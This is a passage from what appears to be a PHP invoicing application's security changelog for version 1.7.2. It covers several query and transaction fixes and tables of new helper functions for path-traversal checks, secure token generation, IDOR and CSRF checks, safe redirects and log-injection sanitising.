`(int) $this->db->escape($minQuantity)` always produced `0` because `escape()` returns a
quoted string like `'5'`. Fixed to `(int) $minQuantity`.

**`Mdl_settings save_batch()` scope and transaction**  
The existence check was scoped to only the keys being saved (previously loaded the full
table). The insert and update operations were wrapped in a DB transaction.

**`Payments.php` JOIN optimisation**  
Two-query PHP-level invoice ID prefetch was replaced with a single `INNER JOIN` on
`ip_invoices`.

---

## 20. New Cross-Cutting Security Infrastructure

Several security helpers were created during the v1.7.2 cycle and are now available
throughout the codebase:

### `application/helpers/file_security_helper.php`

| Function | Purpose |
|----------|---------|
| `validate_safe_filename(string $filename)` | Returns `['valid', 'hash', 'error']`; rejects traversal, null bytes, absolute paths, drive letters |
| `validate_file_in_directory(string $path, string $dir)` | Ensures resolved real path stays within `$dir` |
| `validate_file_access(string $filename, string $base_dir)` | Combines both checks; returns `['valid', 'path', 'hash', 'error']` |
| `validate_db_filename(string $filename, string $base_dir)` | For DB-sourced filenames: strips dir components, validates, resolves path |
| `validate_db_config_parameter(string $value, string $type)` | Validates DB setup params against type-specific allowlist patterns |
| `sanitize_db_config_value(string $value)` | Escapes single quotes for config-file writes |
| `sanitize_database_config_value(string $value)` | Strips control chars from DB config values |
| `sanitize_database_port($port)` | Returns integer 1–65535 or null |
| `strip_exif_metadata(string $filePath)` | Optional EXIF stripping via GD (requires `SEC_STRIP_EXIF_FROM_IMAGES=true`) |
| `sanitize_pdf_footer_content(string $html)` | Allows safe HTML subset; removes external-resource attributes |

### `application/helpers/ip_security_helper.php`

| Function | Purpose |
|----------|---------|
| `generate_password_reset_token()` | 64-char hex from `random_bytes(32)` — 256-bit entropy |
| `generate_secure_salt()` | Bcrypt-compatible 22-char salt from `random_bytes(16)` |
| `generate_secure_token(int $bytes)` | Generic CSPRNG token of arbitrary length |
| `sanitize_exception_for_logging(Throwable $e)` | Strips sensitive data from exception messages before logging |

### `application/helpers/security_helper.php`

| Function | Purpose |
|----------|---------|
| `get_safe_referer()` | Returns `HTTP_REFERER` only if same origin as `BASE_URL`; otherwise returns `base_url()` |
| `validate_redirect_url(string $url)` | Checks scheme + host against base URL |
| `escape_url_for_output(string $url)` | HTML-encodes URL for use in `href` / `src` attributes |
| `escape_url_for_javascript(string $url)` | JSON-encodes URL for inline JS contexts |
| `user_has_invoice_access(int $invoice_id)` | IDOR prevention: checks ownership via session |
| `user_has_quote_access(int $quote_id)` | IDOR prevention for quotes |
| `verify_csrf_token()` | Explicit CSRF token check outside of CI's auto-validation |

### `sanitize_for_logging()`

This function was created during v1.7.1 and is used throughout all new security code.
It strips newlines (`\n`, `\r`), null bytes (`\0`), and other control characters from
any string before it is written to a log file. This prevents a class of log-injection
attacks where an attacker embeds fake log lines in an error message that gets logged.

---

*Document generated: 2026-04-27*
